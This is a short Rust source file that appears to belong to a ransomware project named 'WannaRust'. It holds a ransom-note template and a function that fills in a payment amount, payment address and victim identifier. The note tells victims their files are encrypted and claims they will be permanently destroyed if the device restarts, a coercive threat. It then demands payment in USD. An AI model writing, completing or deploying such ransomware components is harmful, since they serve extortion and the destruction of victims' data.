const RANSOME_NOTE: &str = "
    Q: Why are my files encrypted?
    A: You ran then WannaRust ransomeware.

    Q: What happens if i turn my device off or restart it?
    A: Your files will permanently destroyed.

    Q: Can i recover my files?
    A: Yes of course!

    Q: How do i recover them?
    A: Send USD {AMMOUNT} to {ADDRESS}

    {IDEN}
";

pub fn create_note(address: &str, ammount: u64, identifier: &str) -> String {
    RANSOME_NOTE
        .replace("{AMMOUNT}", &ammount.to_string())
        .replace("{ADDRESS}", address)
        .replace("{IDEN}", identifier)
}